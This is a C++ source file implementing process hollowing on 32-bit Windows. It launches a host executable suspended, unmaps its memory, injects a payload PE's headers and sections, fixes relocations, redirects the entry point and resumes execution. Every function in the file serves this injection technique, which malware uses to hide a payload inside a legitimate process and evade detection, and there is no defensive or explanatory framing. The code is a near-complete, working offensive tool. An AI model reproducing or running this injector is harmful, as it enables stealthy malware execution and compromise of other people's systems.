#include "Hollowing.h"

// Imported from ntdll.dll
pdef_NtUnmapViewOfSection NtUnmapViewOfSection = nullptr;

// Static init
const std::string Hollowing::RELOC_SECTION_NAME = ".reloc";


Hollowing::Hollowing(const std::string& hostPath, const std::string& payloadPath)
	: m_hostPath(hostPath), m_payloadPath(payloadPath)
{
}

void Hollowing::hollow() const
{
	PROCESS_INFORMATION procInfo = { INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE };
	LPVOID payloadImage = nullptr;
	DWORD baseImageDelta = 0;
	PIMAGE_NT_HEADERS piNtHeaders = nullptr;
	PIMAGE_SECTION_HEADER piRelocHeader = nullptr;
	LPVOID hostBaseAddr = nullptr;

	try
	{
		validateBinaries();
		std::cout << "[+] Binaries validated to be PE32" << std::endl;

		loadNativeApiFuncs();
		std::cout << "[+] Native api funcs loaded from ntdll.dll" << std::endl;

		procInfo = createHostSuspended();
		std::cout << "[+] Host process create as suspended" << std::endl;

		payloadImage = getPayloadImage();
		std::cout << "[+] Payload image loaded" << std::endl;

		piNtHeaders = getNtHeadersFromImage(payloadImage);
		std::cout << "[+] NT headers extracted from the payload image" << std::endl;

		hostBaseAddr = getProcBaseImageAddr(procInfo);
		std::cout << "[+] Host's base image address found: 0x" << std::hex << hostBaseAddr << std::endl;
		
		baseImageDelta = reinterpret_cast<DWORD>(hostBaseAddr) - piNtHeaders->OptionalHeader.ImageBase;
		std::cout << "[+] Base image delta calculated: 0x" << std::hex << baseImageDelta << std::endl;

		hollowProcMemory(procInfo, hostBaseAddr);
		std::cout << "[+] Host process hollowed" << std::endl;

		hostBaseAddr = rebindProcHeaders(procInfo, piNtHeaders, hostBaseAddr, payloadImage);
		std::cout << "[+] Host's headers rebinds to payload's headers" << std::endl;

		piRelocHeader = rebindProcSections(procInfo, piNtHeaders, hostBaseAddr, payloadImage);
		std::cout << "[+] Host's sections rebinds to payload's sections" << std::endl;

		updateProcEntryPoint(procInfo, piNtHeaders, hostBaseAddr);
		std::cout << "[+] Host's entry point updated to payload's entry point: 0x" << std::hex << reinterpret_cast<DWORD>(hostBaseAddr) + piNtHeaders->OptionalHeader.AddressOfEntryPoint << std::endl;

		updateProcBaseImageAddr(procInfo, piNtHeaders, hostBaseAddr);
		std::cout << "[+] Host's base image address updated to payload's base image address: 0x" << std::hex << hostBaseAddr << std::endl;

		relocateHostProc(procInfo, piNtHeaders, piRelocHeader, hostBaseAddr, payloadImage, baseImageDelta);
		std::cout << "[+] Host process relocated" << std::endl;

		resumeHost(procInfo);
		std::cout << "[+] Host's thread resume" << std::endl;

		std::cout << "Process hollowing successfully finished!" << std::endl;

	}
	catch (const HollowingException& e)
	{
		std::cerr << e.what() << std::endl;
		std::cerr << "Process hollowing failed!" << std::endl;
	}

	if (payloadImage)
		VirtualFree(payloadImage, 0, MEM_RELEASE);

	if (procInfo.hThread != INVALID_HANDLE_VALUE)
		CloseHandle(procInfo.hThread);

	if (procInfo.hProcess != INVALID_HANDLE_VALUE)
		CloseHandle(procInfo.hProcess);
}

void Hollowing::validateBinaries() const
{
	DWORD hostBinType = 0;

	if (!GetBinaryTypeA(m_hostPath.c_str(), &hostBinType) || hostBinType != SCS_32BIT_BINARY)
		throw CompatibilityException("[-] Host file isn't PE32");

	DWORD payloadBinType = 0;

	if (!GetBinaryTypeA(m_payloadPath.c_str(), &payloadBinType))
		throw CompatibilityException("[-] Payload file isn't PE32");

}

void Hollowing::loadNativeApiFuncs() const
{
	LPVOID funcAddr = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtUnmapViewOfSection");

	if (!funcAddr)
		throw ImportException("[-] Unable to load proc address from ntdll.dll");

	NtUnmapViewOfSection = reinterpret_cast<pdef_NtUnmapViewOfSection>(funcAddr);
}

PROCESS_INFORMATION Hollowing::createHostSuspended() const
{
	STARTUPINFOA startupInfo = { sizeof(STARTUPINFOA) };
	PROCESS_INFORMATION procInfo = { INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE };

	if (!CreateProcessA(m_hostPath.c_str(), nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, nullptr, nullptr, &startupInfo, &procInfo))
		throw CreationFailedException("[-] Failed to create suspended process for the host");

	return procInfo;
}

LPVOID Hollowing::getPayloadImage() const
{
	HANDLE fileHandle = CreateFileA(m_payloadPath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);

	if (fileHandle == INVALID_HANDLE_VALUE)
		throw CreationFailedException("[-] Failed opening the payload file");
	
	DWORD fileSizeH = 0;
	DWORD fileSizeL = GetFileSize(fileHandle, &fileSizeH);

	if (fileSizeH)
	{
		CloseHandle(fileHandle);
		throw FileSizeException("[-] Payload file size is larger than 2 ^ 32");
	}

	LPVOID img = VirtualAlloc(nullptr, fileSizeL, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if (!img)
		throw AllocationException("[-] Failed allocating memory for the payload file");

	DWORD bytesRead = 0;

	if (!ReadFile(fileHandle, img, fileSizeL, &bytesRead, nullptr))
	{
		CloseHandle(fileHandle);
		VirtualFree(img, 0, MEM_RELEASE);
		throw ReadingException("[-] Failed reading the payload file");
	}

	CloseHandle(fileHandle);

	return img;
}

PIMAGE_NT_HEADERS Hollowing::getNtHeadersFromImage(const LPVOID image) const
{
	PIMAGE_DOS_HEADER piDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(image);
	PIMAGE_NT_HEADERS piNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((reinterpret_cast<LPBYTE>(image) + piDosHeader->e_lfanew));

	if (piNtHeaders->OptionalHeader.Magic != PE32_MAGIC) // isn't PE32
		throw CompatibilityException("[-] The executable NT_HEADERS doesn't match the PE32 format");

	return piNtHeaders;
}

LPVOID Hollowing::getProcBaseImageAddr(const PROCESS_INFORMATION& procInfo) const
{
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_INTEGER;

	if (!GetThreadContext(procInfo.hThread, &ctx))
		throw ProccessAccessException("[-] Failed accessing host thread context");

	LPBYTE peb = reinterpret_cast<LPBYTE>(ctx.Ebx);

	LPVOID baseImg = nullptr;

	if (!ReadProcessMemory(procInfo.hProcess, peb + BASE_IMG_OFFSET_FROM_PEB, &baseImg, sizeof(LPVOID), nullptr))
		throw ReadingException("[-] Failed reading the base image from host process");
	
	return baseImg;
}

void Hollowing::hollowProcMemory(const PROCESS_INFORMATION& procInfo, const LPVOID baseImg) const
{
	if (NT_ERROR(NtUnmapViewOfSection(procInfo.hProcess, baseImg)))
		throw ProccessAccessException("[-] Failed hollowing the host process memory");
}

void Hollowing::updateProcBaseImageAddr(const PROCESS_INFORMATION& procInfo, const PIMAGE_NT_HEADERS piNtHeaders, const PVOID hostBaseAddr) const
{
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_INTEGER;

	if (!GetThreadContext(procInfo.hThread, &ctx))
		throw ProccessAccessException("[-] Failed accessing host thread context");

	if (!WriteProcessMemory(procInfo.hProcess, reinterpret_cast<PBYTE>(ctx.Ebx) + BASE_IMG_OFFSET_FROM_PEB, &hostBaseAddr, sizeof(LPVOID), nullptr))
		throw WritingException("[-] Failed writing the new base image into the host process");
}

PVOID Hollowing::rebindProcHeaders(const PROCESS_INFORMATION& procInfo, const PIMAGE_NT_HEADERS piNtHeaders, const PVOID hostBaseAddr, const LPVOID image) const
{
	PVOID headersBase = VirtualAllocEx(procInfo.hProcess, reinterpret_cast<PVOID>(hostBaseAddr),
		piNtHeaders->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!headersBase)
		throw AllocationException("[-] Failed allocating memory for header inside the host process");

	piNtHeaders->OptionalHeader.ImageBase = reinterpret_cast<DWORD>(headersBase);

	if (!WriteProcessMemory(procInfo.hProcess, headersBase, image, piNtHeaders->OptionalHeader.SizeOfHeaders, nullptr))
	{
		VirtualFreeEx(procInfo.hProcess, reinterpret_cast<PVOID>(headersBase), 0, MEM_RELEASE);
		throw WritingException("[-] Failed writing header inside the host process");
	}

	return headersBase;
}

void Hollowing::updateProcEntryPoint(const PROCESS_INFORMATION& procInfo, const PIMAGE_NT_HEADERS piNtHeaders, const PVOID hostBaseAddr) const
{
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_INTEGER;

	if (!GetThreadContext(procInfo.hThread, &ctx))
		throw ProccessAccessException("[-] Failed accessing host thread context");

	ctx.Eax = reinterpret_cast<DWORD>(hostBaseAddr) + piNtHeaders->OptionalHeader.AddressOfEntryPoint;

	ctx.ContextFlags = CONTEXT_INTEGER;

	if (!SetThreadContext(procInfo.hThread, &ctx))
		throw ProccessAccessException("[-] Failed setting host thread context");
}

PIMAGE_SECTION_HEADER Hollowing::rebindProcSections(const PROCESS_INFORMATION& procInfo, const PIMAGE_NT_HEADERS piNtHeaders, const PVOID hostBaseAddr, const LPVOID image) const
{
	PIMAGE_SECTION_HEADER piSectionHeader = nullptr;
	PBYTE imageBase = reinterpret_cast<PBYTE>(hostBaseAddr);
	PIMAGE_SECTION_HEADER piRelocSection = nullptr;
	size_t len = 0;

	for (int i = 0; i < piNtHeaders->FileHeader.NumberOfSections; ++i)
	{
		piSectionHeader = reinterpret_cast<PIMAGE_SECTION_HEADER>(piNtHeaders + 1) + i;

		len = min(sizeof(piSectionHeader->Name), RELOC_SECTION_NAME.length());
		if (!strncmp(reinterpret_cast<const char*>(piSectionHeader->Name), RELOC_SECTION_NAME.c_str(), len))
			piRelocSection = piSectionHeader;

		if (!WriteProcessMemory(procInfo.hProcess, imageBase + piSectionHeader->VirtualAddress, reinterpret_cast<PBYTE>(image) + piSectionHeader->PointerToRawData, piSectionHeader->SizeOfRawData, nullptr))
			throw WritingException("[-] Failed writing sections into the host process");
	}

	return piRelocSection;
}

void Hollowing::relocateHostProc(const PROCESS_INFORMATION& procInfo, const PIMAGE_NT_HEADERS piNtHeaders, const PIMAGE_SECTION_HEADER piRelocSection, const PVOID hostBaseAddr, const PVOID image, const DWORD baseAddrDelta) const
{
	PIMAGE_DATA_DIRECTORY relocData = &piNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD offset = 0;

	while (offset < relocData->Size)
	{
		PBASE_RELOCATION_BLOCK pRelocBlockHeader = reinterpret_cast<PBASE_RELOCATION_BLOCK>(reinterpret_cast<DWORD>(image) + piRelocSection->PointerToRawData + offset);
		
		DWORD entryCount = (pRelocBlockHeader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
		PBASE_RELOCATION_ENTRY blockEntries = reinterpret_cast<PBASE_RELOCATION_ENTRY>(reinterpret_cast<DWORD>(image) + piRelocSection->PointerToRawData + offset + sizeof(BASE_RELOCATION_BLOCK));

		for (DWORD i = 0; i < entryCount; ++i)
		{
			// The base relocation is used to pad the block.
			if (blockEntries[i].Type != IMAGE_REL_BASED_ABSOLUTE)
			{
				DWORD fieldAddr = reinterpret_cast<DWORD>(hostBaseAddr) + pRelocBlockHeader->PageAddress + blockEntries[i].Offset;
				DWORD addressToFix = 0;

				if (!ReadProcessMemory(procInfo.hProcess, reinterpret_cast<LPVOID>(fieldAddr), &addressToFix, sizeof(addressToFix), nullptr))
					throw ReadingException("[-] Can't retrive reloc address from the host");

				addressToFix += baseAddrDelta;

				if (!WriteProcessMemory(procInfo.hProcess, reinterpret_cast<LPVOID>(fieldAddr), &addressToFix, sizeof(addressToFix), nullptr))
					throw WritingException("[-] Failed fixing reloc address on the host");
			}
		}

		offset += pRelocBlockHeader->BlockSize;
	}
}

void Hollowing::resumeHost(const PROCESS_INFORMATION& procInfo) const
{
	if (ResumeThread(procInfo.hThread) == -1)
		throw ProccessAccessException("[-] Can't resume the host's thread");
}
